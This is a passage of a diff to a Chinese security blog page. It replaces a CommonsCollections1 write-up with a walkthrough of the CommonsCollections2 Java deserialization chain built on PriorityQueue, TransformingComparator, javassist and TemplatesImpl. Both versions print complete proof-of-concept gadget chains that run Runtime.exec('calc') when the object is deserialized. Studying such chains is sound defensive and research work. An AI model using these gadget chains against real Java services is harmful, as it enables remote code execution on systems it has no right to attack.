             inputStream.readObject();
         &#125;catch(Exception e)&#123;
             e.printStackTrace();
@@ -568,156 +485,245 @@ public class Main &#123;
     &#125;
 &#125;
 </code></pre>
-<p>创建lazymap那里其实并不需要用到反射，因为lazymap自带了一个方法来帮助我们创建其实例：</p>
-<p><img src="https://baicany.github.io/images/1591853425000-29dszga.png" alt="-w896"></p>
-<p>所以把上述通过反射来创建LazyMap的实例代码改为如下，也是可以成功的后面那个同理：</p>
-<pre><code class="java">  HashMap innermap = new HashMap();
-  LazyMap map = (LazyMap)LazyMap.decorate(innermap,chain);
+<p>这个poc延用了cc1的后半段链，直接在最后触发了ChainedTransformer#transform方法导致rce。但是cc2在yso中的poc并不是这个，而是用到了一个新的点TemplatesImpl。等会分析</p>
+<ul>
+<li>一些细节的问题</li>
+</ul>
+<p>1.为什么这里要put两个值进去?</p>
+<p><img src="https://images.seebug.org/content/images/2020/06/11/1591853426000-33yuyse.png-w331s" alt="-w719"></p>
+<p>这里往queue中put两个值，是为了让其size&gt;1，只有size&gt;1才能使的i&gt;0，才能进入siftDown这个方法中，完成后面的链。</p>
+<p>2.这里为什么要在add之后才通过反射修改comparator的值?</p>
+<p><img src="https://images.seebug.org/content/images/2020/06/11/1591853426000-34klnep.png-w331s" alt="-w368"></p>
+<p>add调用了offer方法：</p>
+<p><img src="https://images.seebug.org/content/images/2020/06/11/1591853426000-35qinjq.png-w331s" alt="-w480"></p>
+<p>offer方法中调用了siftUp方法：</p>
+<p><img src="https://images.seebug.org/content/images/2020/06/11/1591853426000-36rgleo.png-w331s" alt="-w465"></p>
+<p>这里需要保证comparator的值为null，才能够正常的添加元素进queue，如果我们在add之前使comparator为我们构造好的TransformingComparator，就会报这么一个错误：</p>
+<p><img src="https://images.seebug.org/content/images/2020/06/11/1591853427000-37sqffq.png-w331s" alt="-w1159"></p>
+<pre><code class="java">因为在写入的时候就会跳计算器了但是因为
+        O value1 = this.transformer.transform(obj1);  就会调用cc1方法弹计算器了
+        O value2 = this.transformer.transform(obj2);
+        return this.decorated.compare(value1, value2);这里进去
+            public int compare(E obj1, E obj2) &#123;
+        return obj1.compareTo(obj2);
+    &#125;因为我们执行了方法里面没有compareTo了
+    没有就会普通的比较1,2的大小
 </code></pre>
-<h4 id="TransformedMap-1"><a href="#TransformedMap-1" class="headerlink" title="TransformedMap"></a>TransformedMap</h4><p>当 TransformedMap 内的 key 或者 value 发生变化时（例如调用 TransformedMap 的 <code>put</code> 方法时），就会触发相应参数的 Transformer 的 <code>transform()</code> 方法。应为check(改变的时候就要检查字面意思理解很合理吧)这里是利用setvalue改变值</p>
-<p>让来看看这里的transform方法和构造方法</p>
-<pre><code class="java">//构造方法
-    protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123;
-        super(map);
-        this.keyTransformer = keyTransformer;
-        this.valueTransformer = valueTransformer;
+<p>我们回过头来看看javassit：</p>
+<pre><code class="java">import javassist.*;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+
+public class javassit_test &#123;
+    public static void createPseson() throws Exception &#123;
+        ClassPool pool = ClassPool.getDefault();
+        CtClass cc = pool.makeClass(&quot;Cat&quot;);
+        String cmd = &quot;System.out.println(\&quot;evil code\&quot;);&quot;;
+        // 创建 static 代码块，并插入代码
+        cc.makeClassInitializer().insertBefore(cmd);
+        String randomClassName = &quot;EvilCat&quot; + System.nanoTime();
+        cc.setName(randomClassName);
+        CtConstructor cons = new CtConstructor(new CtClass[]&#123;&#125;, cc);
+        cons.setBody(&quot;&#123;&#125;&quot;);
+        cc.addConstructor(cons);
+        // 写入.class 文件
+        cc.writeFile();
     &#125;
-//tranform
-    protected Object checkSetValue(Object value) &#123;
-        return this.valueTransformer.transform(value);
-    &#125;
-</code></pre>
-<p>所以要触发的就是这个了</p>
-<p>接着lazymap上面说到var3是一个注解类继续分析到</p>
-<p>进入whie循环的作用其实是用<code>this.memberValues</code> 这个 Map ，获取其 Key，如果注解类的 memberTypes 属性中存在与 <code>this.memberValues</code> 的 key 相同的属性，并且取得的值不是 ExceptionProxy 的实例也不是 memberValues 中值的实例，则取得其值，并调用 setValue 方法写入值。要这个玩意就不能var7=null所以为什么双个地方一个haspmap可以为空,另一个不可以</p>
-<p>而因为我们要利用改变值这里就是memberValues是transformedmap</p>
-<pre><code class="java">//       Map.Entry表示映射（Map）中的键值对的接口。它定义了访问和操作键值对的方法。先简单理解这里var7是
-//          获取我们传入得到值
-             Map.Entry var5 = (Map.Entry)var4.next();
-            String var6 = (String)var5.getKey();
-            Class var7 = (Class)var3.get(var6);
-</code></pre>
-<p>this.memberValues这里的值是TranformedMap的实例而实例初始化是(Hashmap，null ,tranformer)，所以这里构造方法会super(map),让父类的方法都变成hashmap的 (看过头了但是有一点帮助吧)</p>
-<p>this.memberValues.entrySet()跟进类TranformedMap的entrySet()方法,发现类没有,那就是继承了,跟进父类AbstractInputCheckedMapDecorator的方法</p>
-<pre><code class="java">    public Set entrySet() &#123;
-        return (Set)(this.isSetValueChecking() ? new EntrySet(super.map.entrySet(), this) : super.map.entrySet());
-    &#125;
-</code></pre>
-<p>查看isSetValueChecking()这个方法TranformedMap类重写了</p>
-<pre><code class="java">return this.valueTransformer != null;
-因为我们设置了值所以返回true
-如果为false,super.map.entrySet());说过了是hashmap的东西并不会把TranformedMa类的方法带进去所以触发不了tranform,自己可以更进一下,这就是this的重要性
-</code></pre>
-<p>跟进EntrySet类发现在</p>
-<p>跟进AbstractInputCheckedMapDecorator 的EntrySet类,他的构造方法</p>
-<p>protected EntrySet(Set set, AbstractInputCheckedMapDecorator parent)</p>
-<p>所以不用管第一个传进去的参数因为肯定是set后面也没什么用</p>
-<p>但是这里parent参数是this，所以这里parent是tranformap类</p>
-<p>继续看</p>
-<p>AbstractInputCheckedMapDecorator 的  EntrySet类的iterator() 方法,又创了一个实例所以这里var4出来了</p>
-<pre><code class="java">        public Iterator iterator() &#123;
-            return new EntrySetIterator(super.collection.iterator(), this.parent);
-        &#125;//还是this.parent
-</code></pre>
-<p>跟进实例EntrySetIterator类，找到反序列化用到的方法</p>
-<pre><code class="java">    static class EntrySetIterator extends AbstractIteratorDecorator &#123;
-        private final AbstractInputCheckedMapDecorator parent;
 
-        protected EntrySetIterator(Iterator iterator, AbstractInputCheckedMapDecorator parent) &#123;
-            super(iterator);
-            this.parent = parent;
-        &#125;
-
-        public Object next() &#123;
-            Map.Entry entry = (Map.Entry)super.iterator.next();
-            return new MapEntry(entry, this.parent);
-        &#125;
-    &#125;//this.parent
-</code></pre>
-<p>hasnext()里面意思理解有没有下一个数据</p>
-<p>发现next返回了一个类MapEntry</p>
-<p>因为 Map.Entry var5 = (Map.Entry)var4.next();</p>
-<p>所以var5是这个MapEntry实例</p>
-<pre><code class="java">  static class MapEntry extends AbstractMapEntryDecorator &#123;
-        private final AbstractInputCheckedMapDecorator parent;
-
-        protected MapEntry(Map.Entry entry, AbstractInputCheckedMapDecorator parent) &#123;
-            super(entry);//这里是hashmap
-            this.parent = parent;//还是那个tran类
-        &#125;
-
-        public Object setValue(Object value) &#123;
-            value = this.parent.checkSetValue(value);
-            return super.entry.setValue(value);
+    public static void main(String[] args) &#123;
+        try &#123;
+            createPseson();
+        &#125; catch (Exception e) &#123;
+            e.printStackTrace();
         &#125;
     &#125;
+&#125;
 </code></pre>
-<pre><code class="java">可以继续分析了这里var6就是hashmap的键var7就是从var3我们传入那个泛型中得到这个键值的class
-    //Field.get(Object)获取指定实例的指定字段的值。反射
-    Map.Entry var5 = (Map.Entry)var4.next();
-            String var6 = (String)var5.getKey();
-            Class var7 = (Class)var3.get(var6);
-</code></pre>
-<p>继续这里var7!=null了,</p>
-<p>所以跟进var5里面的setvalue方法就是MapEntry类里面的</p>
-<p>所以就触发了checkSetValue,</p>
-<p>所以跟进checkSetValue,进入tranformermap类</p>
-<pre><code class="java">    protected Object checkSetValue(Object value) &#123;
-        return this.valueTransformer.transform(value);
+<p>上面这段代码中生成的class是这样的：</p>
+<p><img src="https://images.seebug.org/content/images/2020/06/11/1591853427000-38hhzgk.png-w331s" alt="-w442"></p>
+<p>这里的static语句块会在创建类实例的时候执行。</p>
+<p>然后要TemplatesImpl这个类,</p>
+<p>Demo：</p>
+<pre><code class="java">import javassist.*;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import java.lang.ClassLoader;
+import java.lang.reflect.Field;
+
+public class javassit_test &#123;
+    public static void createPseson() throws Exception &#123;
+
+        ClassPool pool = ClassPool.getDefault();
+        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
+        CtClass cc = pool.makeClass(&quot;Cat&quot;);
+        String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;;
+        // 创建 static 代码块，并插入代码
+        cc.makeClassInitializer().insertBefore(cmd);
+        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));
+        // 写入.class 文件
+        byte[] classBytes = cc.toBytecode();
+        byte[][] targetByteCodes = new byte[][]&#123;classBytes&#125;;
+        TemplatesImpl templates = TemplatesImpl.class.newInstance();
+        setFieldValue(templates, &quot;_bytecodes&quot;, targetByteCodes);
+        // 进入 defineTransletClasses() 方法需要的条件
+        setFieldValue(templates, &quot;_name&quot;, &quot;baicnay&quot;);
+        setFieldValue(templates, &quot;_class&quot;, null);
+        setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());
+        
+        templates.newTransformer();
+
     &#125;
+
+    public static void main(String[] args) &#123;
+        try &#123;
+            createPseson();
+        &#125; catch (Exception e) &#123;
+            e.printStackTrace();
+        &#125;
+    &#125;
+
+    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception &#123;
+        final Field field = getField(obj.getClass(), fieldName);
+        field.set(obj, value);
+    &#125;
+
+    public static Field getField(final Class&lt;?&gt; clazz, final String fieldName) &#123;
+        Field field = null;
+        try &#123;
+            field = clazz.getDeclaredField(fieldName);
+            field.setAccessible(true);
+        &#125;
+        catch (NoSuchFieldException ex) &#123;
+            if (clazz.getSuperclass() != null)
+                field = getField(clazz.getSuperclass(), fieldName);
+        &#125;
+        return field;
+    &#125;
+
+&#125;
 </code></pre>
-<p>这里就触发transform函数了</p>
-<p>poc链</p>
-<pre><code class="java">import org.apache.commons.collections.Transformer;
-import org.apache.commons.collections.functors.*;
-import org.apache.commons.collections.map.TransformedMap;
-
-
-import java.io.FileInputStream;
+<p><img src="https://images.seebug.org/content/images/2020/06/11/1591853428000-42fffzl.png-w331s" alt="-w1239"></p>
+<p>此时已经可以成功执行命令了，接下来就是需要找到一个点调用了newTransformer这个方法。</p>
+<p>前面说了，我们已经可以执行到transform方法了，那么我们可以通过InvokerTransformer#transform的反射来调用TemplatesImpl#newtransformer，达到命令执行的目的。</p>
+<p>完整POC：</p>
+<pre><code class="java">import java.io.FileInputStream;
 import java.io.FileOutputStream;
 import java.io.ObjectInputStream;
 import java.io.ObjectOutputStream;
-import java.lang.annotation.*;
-import java.lang.reflect.*;
-import java.util.HashMap;
-import java.util.Map;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.lang.reflect.InvocationTargetException;
+import java.util.PriorityQueue;
 
-public class Main&#123;
-    public static void main(String[] args)  throws ClassNotFoundException, NoSuchMethodException,
-            IllegalAccessException, InvocationTargetException, InstantiationException&#123;
-        // 结合 ChainedTransformer
-        ChainedTransformer chain = new ChainedTransformer(new Transformer[]&#123;
-                new ConstantTransformer(Runtime.class),
-                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;,
-                        new Object[]&#123;&quot;getRuntime&quot;, null&#125;),
-                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;,
-                        new Object[]&#123;null, null&#125;),
-                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)
-        &#125;);
-        Map hashMap = new HashMap();
-        // 这里 key 一定是 下面实例化 AnnotationInvocationHandler 时传入的注解类中存在的属性值
-        // 并且这里的值的一定不是属性值的类型
-        hashMap.put(&quot;value&quot;, 2);
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import javassist.ClassClassPath;
+import javassist.ClassPool;
+import javassist.CtClass;
+import org.apache.commons.collections4.Transformer;
+import org.apache.commons.collections4.comparators.TransformingComparator;
+import org.apache.commons.collections4.functors.ChainedTransformer;
+import org.apache.commons.collections4.functors.ConstantTransformer;
+import org.apache.commons.collections4.functors.InvokerTransformer;
 
-        Map      transformedMap = TransformedMap.decorate(hashMap, null, chain);
-        Constructor constructor = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructor(Class.class,Map.class);
+public class cc2 &#123;
+
+    public static void main(String[] args) throws Exception &#123;
+        Constructor constructor = Class.forName(&quot;org.apache.commons.collections4.functors.InvokerTransformer&quot;).getDeclaredConstructor(String.class);
         constructor.setAccessible(true);
-        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Target.class, transformedMap);
+        InvokerTransformer transformer = (InvokerTransformer) constructor.newInstance(&quot;newTransformer&quot;);
+
+        TransformingComparator comparator = new TransformingComparator(transformer);
+        PriorityQueue queue = new PriorityQueue(1);
+
+        ClassPool pool = ClassPool.getDefault();
+        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
+        CtClass cc = pool.makeClass(&quot;Cat&quot;);
+        String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;;
+        // 创建 static 代码块，并插入代码
+        cc.makeClassInitializer().insertBefore(cmd);
+        cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); //设置父类为AbstractTranslet，避免报错
+        // 写入.class 文件
+        byte[] classBytes = cc.toBytecode();
+        byte[][] targetByteCodes = new byte[][]&#123;classBytes&#125;;
+        TemplatesImpl templates = TemplatesImpl.class.newInstance();
+        setFieldValue(templates, &quot;_bytecodes&quot;, targetByteCodes);
+        // 进入 defineTransletClasses() 方法需要的条件
+        setFieldValue(templates, &quot;_name&quot;, &quot;name&quot;);
+        setFieldValue(templates, &quot;_class&quot;, null);
+
+        Object[] queue_array = new Object[]&#123;templates,1&#125;;
+
+        Field queue_field = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;queue&quot;);
+        queue_field.setAccessible(true);
+        queue_field.set(queue,queue_array);
+
+        Field size = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;size&quot;);
+        size.setAccessible(true);
+        size.set(queue,2);
+
+
+        Field comparator_field = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;comparator&quot;);
+        comparator_field.setAccessible(true);
+        comparator_field.set(queue,comparator);
+
         try&#123;
-            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;cc1.txt&quot;));
-            outputStream.writeObject(handler);
+            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;cc2.txt&quot;));
+            outputStream.writeObject(queue);
             outputStream.close();
 
-            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;cc1.txt&quot;));
+            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;cc2.txt&quot;));
             inputStream.readObject();
         &#125;catch(Exception e)&#123;
             e.printStackTrace();
         &#125;
+
     &#125;
+
+    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception &#123;
+        final Field field = getField(obj.getClass(), fieldName);
+        field.set(obj, value);
+    &#125;
+
+    public static Field getField(final Class&lt;?&gt; clazz, final String fieldName) &#123;
+        Field field = null;
+        try &#123;
+            field = clazz.getDeclaredField(fieldName);
+            field.setAccessible(true);
+        &#125;
+        catch (NoSuchFieldException ex) &#123;
+            if (clazz.getSuperclass() != null)
+                field = getField(clazz.getSuperclass(), fieldName);
+        &#125;
+        return field;
+    &#125;
+
 &#125;
 </code></pre>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>LazyMap利用动态代理来触发transformer</p>
-<p>TransformedMap利用重新setvalue方法触发transformer</p>
+<p>为什么之前那个条件有个不需要加了因为在readObject里面</p>
+<pre><code class="java">_tfactory = new TransformerFactoryImpl();
+</code></pre>
+<p>为什么要修改queue数组的第一个值为TemplatesImpl?</p>
+<p>是因为在调用compare方法的时候，传递了一个obj1进去：</p>
+<p><img src="https://images.seebug.org/content/images/2020/06/11/1591853429000-47jhrrl.png-w331s" alt="-w514"></p>
+<p>通过cc1的学习我们知道，InvokerTransformer调用方法是基于你传递进来的类来进行调用的，所以这里的obj1需要设置为TemplatesImpl，而这个obj1是从这里来的,(所以最后调用了method.invoke(obj, this.iArgs);)</p>
+<p><img src="https://images.seebug.org/content/images/2020/06/11/1591853429000-48qffxb.png-w331s" alt="-w632"></p>
+<p>所以我们需要控制这个c，而这个c是从queue中取出来的，所以在这里我们需要设置queue中第一个值为TemplatesImpl，为什么不能设置为第二个呢？是因为调用compare时，会先对第一个进行调用，如果我们设置TemplatesImpl在第二个位置，则会报出1没有newTransformer方法的错误：</p>
+<p><img src="https://images.seebug.org/content/images/2020/06/11/1591853429000-49pelpn.png-w331s" alt="-w1201"></p>
+<p>为什么要通过反射的方式修改size?</p>
+<p>这个在前面说过了，size必须要大于2，而我们这里并没有调用put方法，所以size默认是为0的，当然还有一种办法，就是先调用两次put，put正常的值进，再修改queue数组，这两种办法的实现原理是一样的。</p>
+<p>这里我觉得非常巧妙</p>
+<pre><code class="java">        Constructor constructor = Class.forName(&quot;org.apache.commons.collections4.functors.InvokerTransformer&quot;).getDeclaredConstructor(String.class);
+        constructor.setAccessible(true);
+        InvokerTransformer transformer = (InvokerTransformer) constructor.newInstance(&quot;newTransformer&quot;);
+</code></pre>
+<p>正好通过反射让 后面的2个参数全为null了</p>
+<pre><code class="java">Class&lt;?&gt;[] paramTypes, Object[] args
+所以在method.invoke(input, this.iArgs);这里的时候正好是impl.newTransformer()了
+</code></pre>
 
         </div>
         <!-- .entry-content -->
@@ -749,9 +755,9 @@ public class Main&#123;
           
             <div class="post-nepre half previous">
           
-            <a href="/2023/07/12/cc2/" rel="prev">
+            <a href="/2023/07/12/java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/" rel="prev">
               <div class="background">
-                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://baicany.github.io/images/a15.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://baicany.github.io/images/a15.jpg">
+                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://baicany.github.io/images/a14.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://baicany.github.io/images/a14.jpg">
               </div>
               <span class="label">
               Previous Post</span>
@@ -767,15 +773,15 @@ public class Main&#123;
           
             <div class="post-nepre half next">
           
-            <a href="/2023/07/08/java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/" rel="next">
+            <a href="/2023/07/10/cc1/" rel="next">
               <div class="background">
-                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://baicany.github.io/images/a12.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://baicany.github.io/images/a12.jpg">
+                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://baicany.github.io/images/a1.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://baicany.github.io/images/a1.jpg">
               </div>
               <span class="label">
               Next Post</span>
               <div class="info">
                 <h3>
-                java类加载机制</h3>
+                cc链1</h3>
                 <hr>
               </div>
             </a>
